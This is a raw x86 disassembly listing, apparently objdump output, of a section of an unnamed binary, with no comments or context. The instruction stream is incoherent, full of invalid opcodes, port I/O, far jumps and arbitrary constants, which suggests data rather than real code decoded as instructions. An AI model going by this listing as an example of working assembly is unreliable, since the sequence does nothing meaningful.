  405e62:	ef                   	out    %eax,(%dx)
  405e63:	34 11                	xor    $0x11,%al
  405e65:	35 d1 25 b0 47       	xor    $0x47b025d1,%eax
  405e6a:	9a 62 0f 24 d9 f6 64 	lcall  $0x64f6,$0xd9240f62
  405e71:	5c                   	pop    %esp
  405e72:	6b 46 15 67          	imul   $0x67,0x15(%esi),%eax
  405e76:	9c                   	pushf
  405e77:	f3 26 20 4c b3 6f    	repz and %cl,%es:0x6f(%ebx,%esi,4)
  405e7d:	54                   	push   %esp
  405e7e:	0b d8                	or     %eax,%ebx
  405e80:	7b 5b                	jnp    0x405edd
  405e82:	61                   	popa
  405e83:	1b 01                	sbb    (%ecx),%eax
  405e85:	40                   	inc    %eax
  405e86:	d6                   	salc
  405e87:	78 d7                	js     0x405e60
  405e89:	60                   	pusha
  405e8a:	01 6c d1 3b          	add    %ebp,0x3b(%ecx,%edx,8)
  405e8e:	d9 fb                	fsincos
  405e90:	dc e9                	fsubr  %st,%st(1)
  405e92:	97                   	xchg   %eax,%edi
  405e93:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e94:	11 3b                	adc    %edi,(%ebx)
  405e96:	ed                   	in     (%dx),%eax
  405e97:	63 09                	arpl   %ecx,(%ecx)
  405e99:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405e9a:	5e                   	pop    %esi
  405e9b:	ea 89 3c 40 f1 b0 b4 	ljmp   $0xb4b0,$0xf1403c89
  405ea2:	1e                   	push   %ds
  405ea3:	0f 7b                	(bad)
  405ea5:	f4                   	hlt
  405ea6:	1e                   	push   %ds
  405ea7:	79 7e                	jns    0x405f27
  405ea9:	ae                   	scas   %es:(%edi),%al
  405eaa:	54                   	push   %esp
  405eab:	04 44                	add    $0x44,%al
  405ead:	44                   	inc    %esp
  405eae:	30 95 55 c5 48 48    	xor    %dl,0x4848c555(%ebp)
  405eb4:	91                   	xchg   %eax,%ecx
  405eb5:	38 0f                	cmp    %cl,(%edi)
  405eb7:	47                   	inc    %edi
  405eb8:	e1 25                	loope  0x405edf
  405eba:	49                   	dec    %ecx
  405ebb:	5a                   	pop    %edx
  405ebc:	17                   	pop    %ss
  405ebd:	9d                   	popf
  405ebe:	f5                   	cmc
  405ebf:	c8 b7 80 d7          	enter  $0x80b7,$0xd7
  405ec3:	e6 40                	out    %al,$0x40
  405ec5:	7c 8a                	jl     0x405e51
  405ec7:	55                   	push   %ebp
  405ec8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405ec9:	5e                   	pop    %esi
  405eca:	1c 75                	sbb    $0x75,%al
  405ecc:	74 96                	je     0x405e64
  405ece:	54                   	push   %esp
  405ecf:	54                   	push   %esp
  405ed0:	df ed                	fucomip %st(5),%st
  405ed2:	53                   	push   %ebx
  405ed3:	5d                   	pop    %ebp
  405ed4:	17                   	pop    %ss
  405ed5:	19 f5                	sbb    %esi,%ebp
  405ed7:	04 c3                	add    $0xc3,%al
  405ed9:	b9 0a 1f 02 60       	mov    $0x60021f0a,%ecx
  405ede:	31 35 34 62 cb 68    	xor    %esi,0x68cb6234
  405ee4:	44                   	inc    %esp
  405ee5:	f4                   	hlt
  405ee6:	8b 08                	mov    (%eax),%ecx
  405ee8:	75 44                	jne    0x405f2e
  405eea:	71 35                	jno    0x405f21
  405eec:	5c                   	pop    %esp
  405eed:	05 ea aa 04 30       	add    $0x3004aaea,%eax
  405ef2:	94                   	xchg   %eax,%esp
  405ef3:	b6 0c                	mov    $0xc,%dh
  405ef5:	57                   	push   %edi
  405ef6:	e1 3a                	loope  0x405f32
  405ef8:	75 74                	jne    0x405f6e
  405efa:	9e                   	sahf
  405efb:	03 04 50             	add    (%eax,%edx,2),%eax
  405efe:	ce                   	into
  405eff:	b1 30                	mov    $0x30,%cl
  405f01:	a2 54 a5 5b 4e       	mov    %al,0x4e5ba554
  405f06:	68 00 1f 83 7a       	push   $0x7a831f00
  405f0b:	b6 14                	mov    $0x14,%dh
  405f0d:	4d                   	dec    %ebp
  405f0e:	20 76 d4             	and    %dh,-0x2c(%esi)
  405f11:	2d 45 78 0a 26       	sub    $0x260a7845,%eax
  405f16:	97                   	xchg   %eax,%edi
  405f17:	d5 14                	aad    $0x14
  405f19:	73 13                	jae    0x405f2e
  405f1b:	62 50 64             	bound  %edx,0x64(%eax)
  405f1e:	99                   	cltd
  405f1f:	43                   	inc    %ebx
  405f20:	49                   	dec    %ecx
  405f21:	0c d6                	or     $0xd6,%al
  405f23:	85 06                	test   %eax,(%esi)
  405f25:	e7 08                	out    %eax,$0x8
  405f27:	1b 07                	sbb    (%edi),%eax
  405f29:	21 4b 19             	and    %ecx,0x19(%ebx)
  405f2c:	89 02                	mov    %eax,(%edx)
  405f2e:	00 d5                	add    %dl,%ch
  405f30:	3e a8 6b             	ds test $0x6b,%al
  405f33:	18 01                	sbb    %al,(%ecx)
  405f35:	58                   	pop    %eax
  405f36:	7d a4                	jge    0x405edc
  405f38:	92                   	xchg   %eax,%edx
  405f39:	82 f2 3c             	xor    $0x3c,%dl
  405f3c:	01 b1 01 78 69 10    	add    %esi,0x10697801(%ecx)
  405f42:	95                   	xchg   %eax,%ebp
  405f43:	71 98                	jno    0x405edd
  405f45:	f7 2c aa             	imull  (%edx,%ebp,4)
  405f48:	04 c8                	add    $0xc8,%al
  405f4a:	27                   	daa
  405f4b:	12 67 03             	adc    0x3(%edi),%ah
  405f4e:	03 41 ee             	add    -0x12(%ecx),%eax
  405f51:	8b 9f 30 34 63 51    	mov    0x51633430(%edi),%ebx
  405f57:	f2 e6 21             	repnz out %al,$0x21
  405f5a:	0b aa fc 28 6c 6c    	or     0x6c6c28fc(%edx),%ebp
  405f60:	61                   	popa
  405f61:	0b 1a                	or     (%edx),%ebx
  405f63:	93                   	xchg   %eax,%ebx
  405f64:	34 2a                	xor    $0x2a,%al
  405f66:	f0 21 14 22          	lock and %edx,(%edx,%eiz,1)
  405f6a:	00 f3                	add    %dh,%bl
  405f6c:	d0 e3                	shl    $1,%bl
  405f6e:	7b 34                	jnp    0x405fa4
  405f70:	e7 e1                	out    %eax,$0xe1
  405f72:	31 4f 3c             	xor    %ecx,0x3c(%edi)
  405f75:	67 9d                	addr16 popf
  405f77:	df 59 01             	fistps 0x1(%ecx)
  405f7a:	40                   	inc    %eax
  405f7b:	02 b6 65 76 7e 44    	add    0x447e7665(%esi),%dh
  405f81:	0c e4                	or     $0xe4,%al
  405f83:	d9 37                	fnstenv (%edi)
  405f85:	49                   	dec    %ecx
  405f86:	9c                   	pushf
  405f87:	0b d7                	or     %edi,%edx
  405f89:	24 21                	and    $0x21,%al
  405f8b:	64 46                	fs inc %esi
  405f8d:	6c                   	insb   (%dx),%es:(%edi)
  405f8e:	3d 6d df 42 86       	cmp    $0x8642df6d,%eax
  405f93:	a0 42 e9 7e d4       	mov    0xd47ee942,%al
  405f98:	6c                   	insb   (%dx),%es:(%edi)
  405f99:	23 27                	and    (%edi),%esp
  405f9b:	6c                   	insb   (%dx),%es:(%edi)
  405f9c:	66 50                	push   %ax
  405f9e:	7e 2f                	jle    0x405fcf
  405fa0:	0a ca                	or     %dl,%cl
  405fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  405fa3:	f9                   	stc
  405fa4:	61                   	popa
  405fa5:	ee                   	out    %al,(%dx)
  405fa6:	8e c7                	mov    %edi,%es
  405fa8:	1c 42                	sbb    $0x42,%al
  405faa:	30 d1                	xor    %dl,%cl
  405fac:	5b                   	pop    %ebx
  405fad:	1a 05 56 09 2a ed    	sbb    0xed2a0956,%al
  405fb3:	0c f6                	or     $0xf6,%al
  405fb5:	9c                   	pushf
  405fb6:	48                   	dec    %eax
  405fb7:	fd                   	std
  405fb8:	21 0d e1 24 0b 21    	and    %ecx,0x210b24e1
  405fbe:	9a 45 70 1a 1e 0f c4 	lcall  $0xc40f,$0x1e1a7045
  405fc5:	7b 81                	jnp    0x405f48
  405fc7:	09 06                	or     %eax,(%esi)
  405fc9:	5a                   	pop    %edx
  405fca:	66 b8 fd c1          	mov    $0xc1fd,%ax
  405fce:	0e                   	push   %cs
  405fcf:	07                   	pop    %es
  405fd0:	10 fc                	adc    %bh,%ah
  405fd2:	06                   	push   %es
  405fd3:	65 18 97 5a 00 2c 13 	sbb    %dl,%gs:0x132c005a(%edi)
  405fda:	8c b6 2c e4 3c 6b    	mov    %?,0x6b3ce42c(%esi)
  405fe0:	5e                   	pop    %esi
  405fe1:	04 14                	add    $0x14,%al
  405fe3:	08 14 c7             	or     %dl,(%edi,%eax,8)
  405fe6:	41                   	inc    %ecx
  405fe7:	ad                   	lods   %ds:(%esi),%eax
  405fe8:	10 44 6c 6a          	adc    %al,0x6a(%esp,%ebp,2)
  405fec:	ac                   	lods   %ds:(%esi),%al
  405fed:	91                   	xchg   %eax,%ecx
  405fee:	43                   	inc    %ebx
  405fef:	61                   	popa
  405ff0:	08 25 63 9a 8f 06    	or     %ah,0x68f9a63
  405ff6:	17                   	pop    %ss
  405ff7:	10 3b                	adc    %bh,(%ebx)
  405ff9:	84 89 9a a2 3c a3    	test   %cl,-0x5cc35d66(%ecx)
  405fff:	d9 38                	fnstcw (%eax)
  406001:	97                   	xchg   %eax,%edi
  406002:	9a af 7f ab 10 fa dd 	lcall  $0xddfa,$0x10ab7faf
  406009:	03 83 07 44 df 16    	add    0x16df4407(%ebx),%eax
  40600f:	a1 08 63 52 7d       	mov    0x7d526308,%eax
  406014:	44                   	inc    %esp
  406015:	a3 dc f7 94 f9       	mov    %eax,0xf994f7dc
  40601a:	51                   	push   %ecx
  40601b:	c0 5c 5c 43 b0       	rcrb   $0xb0,0x43(%esp,%ebx,2)
  406020:	9c                   	pushf
  406021:	33 4a 01             	xor    0x1(%edx),%ecx
  406024:	54                   	push   %esp
  406025:	37                   	aaa
  406026:	67 28 e3             	addr16 sub %ah,%bl
  406029:	e9 0c 65 7e 05       	jmp    0x5bec53a
  40602e:	3c 38                	cmp    $0x38,%al
  406030:	d8 45 d1             	fadds  -0x2f(%ebp)
  406033:	b2 18                	mov    $0x18,%dl
  406035:	28 33                	sub    %dh,(%ebx)
  406037:	94                   	xchg   %eax,%esp
  406038:	51                   	push   %ecx
  406039:	74 08                	je     0x406043
  40603b:	4c                   	dec    %esp
  40603c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40603d:	c4 87 f8 5c 3d fd    	les    -0x2c2a308(%edi),%eax
  406043:	6b e1 c9             	imul   $0xffffffc9,%ecx,%esp
  406046:	61                   	popa
  406047:	90                   	nop
  406048:	58                   	pop    %eax
  406049:	bf 7f 86 62 e2       	mov    $0xe262867f,%edi
  40604e:	a3 20 3a 80 00       	mov    %eax,0x803a20
  406053:	0e                   	push   %cs
  406054:	d6                   	salc
  406055:	3a a7 7d 51 be 30    	cmp    0x30be517d(%edi),%ah
  40605b:	33 38                	xor    (%eax),%edi
  40605d:	a8 7c                	test   $0x7c,%al
  40605f:	81 a3 3b 29 04 f0 fe 	andl   $0x185afdfe,-0xffbd6c5(%ebx)
  406066:	fd 5a 18 
  406069:	0b 04 fe             	or     (%esi,%edi,8),%eax
  40606c:	f4                   	hlt
  40606d:	fe                   	(bad)
  40606e:	10 5c 6c 0a          	adc    %bl,0xa(%esp,%ebp,2)
  406072:	09 8d 74 d0 5a 50    	or     %ecx,0x505ad074(%ebp)
  406078:	1b 71 2f             	sbb    0x2f(%ecx),%esi
  40607b:	c7 44 e8 84 3e 9a ad 	movl   $0x47ad9a3e,-0x7c(%eax,%ebp,8)
  406082:	47 
  406083:	2e 49                	cs dec %ecx
  406085:	b1 12                	mov    $0x12,%cl
  406087:	2b 9c 6b 22 5e 46 e9 	sub    -0x16b9a1de(%ebx,%ebp,2),%ebx
  40608e:	09 cd                	or     %ecx,%ebp
  406090:	92                   	xchg   %eax,%edx
  406091:	0b 76 77             	or     0x77(%esi),%esi
  406094:	90                   	nop
  406095:	c2 2e 23             	ret    $0x232e
  406098:	9c                   	pushf
  406099:	b9 1c b7 95 29       	mov    $0x2995b71c,%ecx
  40609e:	7c 71                	jl     0x406111
  4060a0:	39 22                	cmp    %esp,(%edx)
  4060a2:	6c                   	insb   (%dx),%es:(%edi)
  4060a3:	b4 34                	mov    $0x34,%ah
  4060a5:	c0 6c 4f 76 f1       	shrb   $0xf1,0x76(%edi,%ecx,2)
  4060aa:	16                   	push   %ss
  4060ab:	2c 5a                	sub    $0x5a,%al
  4060ad:	b0 fc                	mov    $0xfc,%al
  4060af:	5b                   	pop    %ebx
  4060b0:	02 65 34             	add    0x34(%ebp),%ah
  4060b3:	7c a8                	jl     0x40605d
  4060b5:	18 fd                	sbb    %bh,%ch
  4060b7:	ad                   	lods   %ds:(%esi),%eax
  4060b8:	8c 3e                	mov    %?,(%esi)
  4060ba:	8c 96 9b 8a 7d 01    	mov    %ss,0x17d8a9b(%esi)
  4060c0:	cf                   	iret
  4060c1:	7c f3                	jl     0x4060b6
  4060c3:	0a fd                	or     %ch,%bh
  4060c5:	8f 40 bc             	pop    -0x44(%eax)
  4060c8:	01 a8 e9 7f 34 3b    	add    %ebp,0x3b347fe9(%eax)
  4060ce:	87 a4 33 5c c9 fe 0c 	xchg   %esp,0xcfec95c(%ebx,%esi,1)
  4060d5:	92                   	xchg   %eax,%edx
  4060d6:	dc 71 d6             	fdivl  -0x2a(%ecx)
  4060d9:	3d 0e 0d cc 51       	cmp    $0x51cc0d0e,%eax
  4060de:	d3 4a 26             	rorl   %cl,0x26(%edx)
  4060e1:	59                   	pop    %ecx
  4060e2:	b9 be 18 7b 68       	mov    $0x687b18be,%ecx
  4060e7:	12 67 ef             	adc    -0x11(%edi),%ah
  4060ea:	92                   	xchg   %eax,%edx
  4060eb:	c4 68 d9             	les    -0x27(%eax),%ebp
  4060ee:	ac                   	lods   %ds:(%esi),%al
  4060ef:	66 c0 10 c4          	data16 rclb $0xc4,(%eax)
  4060f3:	56                   	push   %esi
  4060f4:	b3 73                	mov    $0x73,%bl
  4060f6:	7c 50                	jl     0x406148
  4060f8:	3e b9 db 7a 3f cd    	ds mov $0xcd3f7adb,%ecx
  4060fe:	51                   	push   %ecx
  4060ff:	50                   	push   %eax
  406100:	7f 25                	jg     0x406127
  406102:	28 48 ee             	sub    %cl,-0x12(%eax)
  406105:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  406108:	5a                   	pop    %edx
  406109:	66 a2 88 61 b0 29    	data16 mov %al,0x29b06188
  40610f:	2f                   	das
  406110:	32 24 4e             	xor    (%esi,%ecx,2),%ah
  406113:	e2 52                	loop   0x406167
  406115:	5b                   	pop    %ebx
  406116:	17                   	pop    %ss
  406117:	1a 05 b3 88 57 5b    	sbb    0x5b5788b3,%al
  40611d:	cb                   	lret
  40611e:	de 61 6c             	fisubs 0x6c(%ecx)
  406121:	86 b4 0e 46 d5 06 5b 	xchg   %dh,0x5b06d546(%esi,%ecx,1)
  406128:	fe                   	(bad)
  406129:	98                   	cwtl
  40612a:	5c                   	pop    %esp
  40612b:	29 2e                	sub    %ebp,(%esi)
  40612d:	b7 b2                	mov    $0xb2,%bh
  40612f:	3a 31                	cmp    (%ecx),%dh
  406131:	90                   	nop
  406132:	c5 e8 3a             	(bad)
  406135:	5d                   	pop    %ebp
  406136:	31 83 a5 ba 48 c1    	xor    %eax,-0x3eb7455b(%ebx)
  40613c:	ce                   	into
  40613d:	cb                   	lret
  40613e:	ba 74 75 e6 4c       	mov    $0x4ce67574,%edx
  406143:	86 4d 6a             	xchg   %cl,0x6a(%ebp)
  406146:	e3 9e                	jecxz  0x4060e6
  406148:	62 23                	bound  %esp,(%ebx)
  40614a:	24 5e                	and    $0x5e,%al
  40614c:	3b db                	cmp    %ebx,%ebx
  40614e:	e0 ac                	loopne 0x4060fc
  406150:	02 63 14             	add    0x14(%ebx),%ah
  406153:	ff 9c 56 8a 3b 03 32 	lcall  *0x32033b8a(%esi,%edx,2)
  40615a:	24 91                	and    $0x91,%al
  40615c:	33 ab db 2a b9 5f    	xor    0x5fb92adb(%ebx),%ebp
  406162:	db 17                	fistl  (%edi)
  406164:	5f                   	pop    %edi
  406165:	79 3f                	jns    0x4061a6
  406167:	df 28                	fildll (%eax)
  406169:	c5 16                	lds    (%esi),%edx
  40616b:	d1 36                	shll   $1,(%esi)
  40616d:	60                   	pusha
  40616e:	78 78                	js     0x4061e8
  406170:	52                   	push   %edx
  406171:	e9 21 1a 43 37       	jmp    0x37837b97
  406176:	cd 0a                	int    $0xa
  406178:	61                   	popa
  406179:	52                   	push   %edx
  40617a:	a9 63 86 04 b4       	test   $0xb4048663,%eax
  40617f:	db 37                	(bad) (%edi)
  406181:	78 00                	js     0x406183
  406183:	88 01                	mov    %al,(%ecx)
  406185:	9a 5d eb 82 68 0d 19 	lcall  $0x190d,$0x6882eb5d
  40618c:	fd                   	std
  40618d:	23 01                	and    (%ecx),%eax
  40618f:	fe                   	(bad)
  406190:	79 85                	jns    0x406117
  406192:	76 61                	jbe    0x4061f5
  406194:	46                   	inc    %esi
  406195:	0d 6a 64 32 64       	or     $0x6432646a,%eax
  40619a:	b6 0f                	mov    $0xf,%dh
  40619c:	58                   	pop    %eax
  40619d:	34 3f                	xor    $0x3f,%al
  40619f:	04 91                	add    $0x91,%al
  4061a1:	60                   	pusha
  4061a2:	79 bc                	jns    0x406160
  4061a4:	0f 61 60 5c          	punpcklwd 0x5c(%eax),%mm4
  4061a8:	54                   	push   %esp
  4061a9:	08 fa                	or     %bh,%dl
  4061ab:	b1 a0                	mov    $0xa0,%cl
  4061ad:	3e fa                	ds cli
  4061af:	b9 7d b7 60 41       	mov    $0x4160b77d,%ecx
  4061b4:	a3 5c b1 58 32       	mov    %eax,0x3258b15c
  4061b9:	a8 3a                	test   $0x3a,%al
  4061bb:	60                   	pusha
  4061bc:	04 64                	add    $0x64,%al
  4061be:	79 2e                	jns    0x4061ee
  4061c0:	35 31 3a fa f0       	xor    $0xf0fa3a31,%eax
  4061c5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4061c6:	c1 46 40 ff          	roll   $0xff,0x40(%esi)
  4061ca:	d3 93 06 3b 30 d2    	rcll   %cl,-0x2dcfc4fa(%ebx)
  4061d0:	3c 9f                	cmp    $0x9f,%al
  4061d2:	16                   	push   %ss
  4061d3:	20 20                	and    %ah,(%eax)
  4061d5:	10 e7                	adc    %ah,%bh
  4061d7:	d3 62 7a             	shll   %cl,0x7a(%edx)
  4061da:	00 00                	add    %al,(%eax)
  4061dc:	78 3f                	js     0x40621d
  4061de:	f9                   	stc
  4061df:	b0 e0                	mov    $0xe0,%al
  4061e1:	31 9d e3 7c fe d0    	xor    %ebx,-0x2f01831d(%ebp)
  4061e7:	9c                   	pushf
  4061e8:	e7 47                	out    %eax,$0x47
  4061ea:	c7                   	(bad)
  4061eb:	20 c0                	and    %al,%al
  4061ed:	c0 b0 a4 79 7e 74 25 	shlb   $0x25,0x747e79a4(%eax)
  4061f4:	a0 a0 90 a7 e5       	mov    0xe5a790a0,%al
  4061f9:	c7                   	(bad)
  4061fa:	f4                   	hlt
  4061fb:	80 80 11 8e 9e 34 70 	addb   $0x70,0x349e8e11(%eax)
  406202:	2f                   	das
  406203:	64 4e                	fs dec %esi
  406205:	ea 8d 88 36 40 13 69 	ljmp   $0x6913,$0x4036888d
  40620c:	02 2f                	add    (%edi),%ch
  40620e:	c0 44 98 22 2e       	rolb   $0x2e,0x22(%eax,%ebx,4)
  406213:	f0 22 d0             	lock and %al,%dl
  406216:	22 2d e0 3e c0 22    	and    0x22c03ee0,%ch
  40621c:	2c 59                	sub    $0x59,%al
  40621e:	c2 c0 47             	ret    $0x47c0
  406221:	51                   	push   %ecx
  406222:	83 60 7d 3c          	andl   $0x3c,0x7d(%eax)
  406226:	01 54 5a 87          	add    %edx,-0x79(%edx,%ebx,2)
  40622a:	b9 af 7f 4a 96       	mov    $0x964a7faf,%ecx
  40622f:	2c 60                	sub    $0x60,%al
  406231:	15 fe b8 90 a9       	adc    $0xa990b8fe,%eax
  406236:	5e                   	pop    %esi
  406237:	93                   	xchg   %eax,%ebx
  406238:	76 5c                	jbe    0x406296
  40623a:	60                   	pusha
  40623b:	03 d0                	add    %eax,%edx
  40623d:	73 58                	jae    0x406297
  40623f:	40                   	inc    %eax
  406240:	30 b9 06 a0 bf b0    	xor    %bh,-0x4f405ffa(%ecx)
  406246:	a8 63                	test   $0x63,%al
  406248:	05 d0 e7 79 9e       	add    $0x9e79e7d0,%eax
  40624d:	e7 c0                	out    %eax,$0xc0
  40624f:	b0 a0                	mov    $0xa0,%al
  406251:	90                   	nop
  406252:	80 bd 0d 49 a6 e7 7d 	cmpb   $0x7d,-0x1859b6f3(%ebp)
  406259:	7f fe                	jg     0x406259
  40625b:	41                   	inc    %ecx
  40625c:	45                   	inc    %ebp
  40625d:	be ff 78 f5 4e       	mov    $0x4ef578ff,%esi
  406262:	b6 fe                	mov    $0xfe,%dh
  406264:	c3                   	ret
  406265:	ab                   	stos   %eax,%es:(%edi)
  406266:	3f                   	aas
  406267:	42                   	inc    %edx
  406268:	69 74 73 ef a7 91 ec 	imul   $0x3cec91a7,-0x11(%ebx,%esi,2),%esi
  40626f:	3c 
  406270:	be df c6 bc 40       	mov    $0x40bcc6df,%esi
  406275:	ea e8 fa f3 44 0f 9c 	ljmp   $0x9c0f,$0x44f3fae8
  40627c:	51                   	push   %ecx
  40627d:	2c eb                	sub    $0xeb,%al
  40627f:	f4                   	hlt
  406280:	62 59 3d             	bound  %ebx,0x3d(%ecx)
  406283:	49                   	dec    %ecx
  406284:	a3 0f 04 0c b7       	mov    %eax,0xb70c040f
  406289:	75 50                	jne    0x4062db
  40628b:	b5 98                	mov    $0x98,%ch
  40628d:	3d 06 fc 52 1c       	cmp    $0x1c52fc06,%eax
  406292:	7c 01                	jl     0x406295
  406294:	5e                   	pop    %esi
  406295:	01 dc                	add    %ebx,%esp
  406297:	d1 71 76             	shll   $1,0x76(%ecx)
  40629a:	76 0f                	jbe    0x4062ab
  40629c:	02 40 2c             	add    0x2c(%eax),%al
  40629f:	58                   	pop    %eax
  4062a0:	34 71                	xor    $0x71,%al
  4062a2:	70 1b                	jo     0x4062bf
  4062a4:	03 c0                	add    %eax,%eax
  4062a6:	e2 30                	loop   0x4062d8
  4062a8:	5a                   	pop    %edx
  4062a9:	34 6c                	xor    $0x6c,%al
  4062ab:	58                   	pop    %eax
  4062ac:	ff 8c c4 b0 96 6c 5e 	decl   0x5e6c96b0(%esp,%eax,8)
  4062b3:	80 b6 ca 83 a0 a1 27 	xorb   $0x27,-0x5e5f7c36(%esi)
  4062ba:	73 ae                	jae    0x40626a
  4062bc:	60                   	pusha
  4062bd:	d7                   	xlat   %ds:(%ebx)
  4062be:	57                   	push   %edi
  4062bf:	8d 61 43             	lea    0x43(%ecx),%esp
  4062c2:	28 fe                	sub    %bh,%dh
  4062c4:	8e 01                	mov    (%ecx),%es
  4062c6:	80 01 e8             	addb   $0xe8,(%ecx)
  4062c9:	38 d3                	cmp    %dl,%bl
  4062cb:	17                   	pop    %ss
  4062cc:	48                   	dec    %eax
  4062cd:	05 48 2c 19 ee       	add    $0xee192c48,%eax
  4062d2:	f6 35 f4 05 87 fc    	divb   0xfc8705f4
  4062d8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4062d9:	a0 8e 58 fe 64       	mov    0x64fe588e,%al
  4062de:	52                   	push   %edx
  4062df:	01 c3                	add    %eax,%ebx
  4062e1:	eb b0                	jmp    0x406293
  4062e3:	4c                   	dec    %esp
  4062e4:	4a                   	dec    %edx
  4062e5:	6b d1 fc             	imul   $0xfffffffc,%ecx,%edx
  4062e8:	96                   	xchg   %eax,%esi
  4062e9:	6c                   	insb   (%dx),%es:(%edi)
  4062ea:	70 ac                	jo     0x406298
  4062ec:	b3 70                	mov    $0x70,%bl
  4062ee:	57                   	push   %edi
  4062ef:	3c b1                	cmp    $0xb1,%al
  4062f1:	ed                   	in     (%dx),%eax
  4062f2:	c4 7f fc             	les    -0x4(%edi),%edi
  4062f5:	58                   	pop    %eax
  4062f6:	3d 90 b6 0c a3       	cmp    $0xa30cb690,%eax
  4062fb:	5d                   	pop    %ebp
  4062fc:	0e                   	push   %cs
  4062fd:	4f                   	dec    %edi
  4062fe:	3b 39                	cmp    (%ecx),%edi
  406300:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406301:	23 61 01             	and    0x1(%ecx),%esp
  406304:	d7                   	xlat   %ds:(%ebx)
  406305:	69 89 80 2e 2c ff 40 	imul   $0xc6304d40,-0xd3d180(%ecx),%ecx
  40630c:	4d 30 c6 
  40630f:	94                   	xchg   %eax,%esp
  406310:	f1                   	int1
  406311:	b4 07                	mov    $0x7,%ah
  406313:	2d 2c 59 5c 86       	sub    $0x865c592c,%eax
  406318:	94                   	xchg   %eax,%esp
  406319:	0b 46 1c             	or     0x1c(%esi),%eax
  40631c:	3d ce d5 42 0c       	cmp    $0xc42d5ce,%eax
  406321:	76 c0                	jbe    0x4062e3
  406323:	ec                   	in     (%dx),%al
  406324:	90                   	nop
  406325:	fc                   	cld
  406326:	fe                   	(bad)
  406327:	28 ec                	sub    %ch,%ah
  406329:	fe                   	(bad)
  40632a:	eb 80                	jmp    0x4062ac
  40632c:	c7                   	(bad)
  40632d:	5a                   	pop    %edx
  40632e:	36 15 a4 c3 9e 1c    	ss adc $0x1c9ec3a4,%eax
  406334:	4a                   	dec    %edx
  406335:	94                   	xchg   %eax,%esp
  406336:	98                   	cwtl
  406337:	81 47 16 68 9b e4 66 	addl   $0x66e49b68,0x16(%edi)
  40633e:	b7 00                	mov    $0x0,%bh
  406340:	6b 77 83 9a          	imul   $0xffffff9a,-0x7d(%edi),%esi
  406344:	51                   	push   %ecx
  406345:	c6                   	(bad)
  406346:	88 8e c0 a3 03 e0    	mov    %cl,-0x1ffc5c40(%esi)
  40634c:	c4 1c 70             	les    (%eax,%esi,2),%ebx
  40634f:	01 0b                	add    %ecx,(%ebx)
  406351:	09 53 96             	or     %edx,-0x6a(%ebx)
  406354:	17                   	pop    %ss
  406355:	d9 0a                	(bad) (%edx)
  406357:	74 97                	je     0x4062f0
  406359:	9c                   	pushf
  40635a:	e6 63                	out    %al,$0x63
  40635c:	0c 3f                	or     $0x3f,%al
  40635e:	84 ee                	test   %ch,%dh
  406360:	3b 09                	cmp    (%ecx),%ecx
  406362:	8d 03                	lea    (%ebx),%eax
  406364:	10 02                	adc    %al,(%edx)
  406366:	cc                   	int3
  406367:	c0 a0 8f 92 5c fb f9 	shlb   $0xf9,-0x4a36d71(%eax)
  40636e:	2e a8 fe             	cs test $0xfe,%al
  406371:	84 25 48 b6 44 af    	test   %ah,0xaf44b648
  406377:	a3 ca ca 03 9e       	mov    %eax,0x9e03caca
  40637c:	29 e2                	sub    %esp,%edx
  40637e:	49                   	dec    %ecx
  40637f:	06                   	push   %es
  406380:	e2 cf                	loop   0x406351
  406382:	55                   	push   %ebp
  406383:	cd 48                	int    $0x48
  406385:	dc 48 54             	fmull  0x54(%eax)
  406388:	7f 4f                	jg     0x4063d9
  40638a:	39 6a de             	cmp    %ebp,-0x22(%edx)
  40638d:	f7 d3                	not    %ebx
  40638f:	43                   	inc    %ebx
  406390:	75 bc                	jne    0x40634e
  406392:	fa                   	cli
  406393:	73 70                	jae    0x406405
  406395:	74 57                	je     0x4063ee
  406397:	6f                   	outsl  %ds:(%esi),(%dx)
  406398:	0c 75                	or     $0x75,%al
  40639a:	6c                   	insb   (%dx),%es:(%edi)
  40639b:	10 57 6b             	adc    %dl,0x6b(%edi)
  40639e:	30 74 c7 1c          	xor    %dh,0x1c(%edi,%eax,8)
  4063a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4063a3:	d2 5d 52             	rcrb   %cl,0x52(%ebp)
  4063a6:	34 6c                	xor    $0x6c,%al
  4063a8:	14 50                	adc    $0x50,%al
  4063aa:	31 1d e3 1b 1b 3c    	xor    %ebx,0x3c1b1be3
  4063b0:	94                   	xchg   %eax,%esp
  4063b1:	b3 14                	mov    $0x14,%bl
  4063b3:	22 65 99             	and    -0x67(%ebp),%ah
  4063b6:	49                   	dec    %ecx
  4063b7:	ed                   	in     (%dx),%eax
  4063b8:	94                   	xchg   %eax,%esp
  4063b9:	21 28                	and    %ebp,(%eax)
  4063bb:	38 ff                	cmp    %bh,%bh
  4063bd:	40                   	inc    %eax
  4063be:	33 99 16 fe 68 18    	xor    0x1868fe16(%ecx),%ebx
  4063c4:	ff 68 ae             	ljmp   *-0x52(%eax)
  4063c7:	cb                   	lret
  4063c8:	2d a6 00 e9 b5       	sub    $0xb5e900a6,%eax
  4063cd:	6c                   	insb   (%dx),%es:(%edi)
  4063ce:	27                   	daa
  4063cf:	5d                   	pop    %ebp
  4063d0:	4b                   	dec    %ebx
  4063d1:	fc                   	cld
  4063d2:	7a 23                	jp     0x4063f7
  4063d4:	38 a2 bd 36 6c ae    	cmp    %ah,-0x5193c943(%edx)
  4063da:	08 1a                	or     %bl,(%edx)
  4063dc:	17                   	pop    %ss
  4063dd:	c7                   	(bad)
  4063de:	bd 08 9d e9 21       	mov    $0x21e99d08,%ebp
  4063e3:	f6 29                	imulb  (%ecx)
  4063e5:	24 1c                	and    $0x1c,%al
  4063e7:	8f                   	(bad)
  4063e8:	2b 8f 73 28 59 fc    	sub    -0x3a6d78d(%edi),%ecx
  4063ee:	0b 1e                	or     (%esi),%ebx
  4063f0:	f8                   	clc
  4063f1:	fe                   	(bad)
  4063f2:	ef                   	out    %eax,(%dx)
  4063f3:	e8 fe 3a 1d 85       	call   0x855d9ef6
  4063f8:	64 80 14 fd e7 55 77 	adcb   $0xd8,%fs:-0x6a88aa19(,%edi,8)
  4063ff:	95 d8 
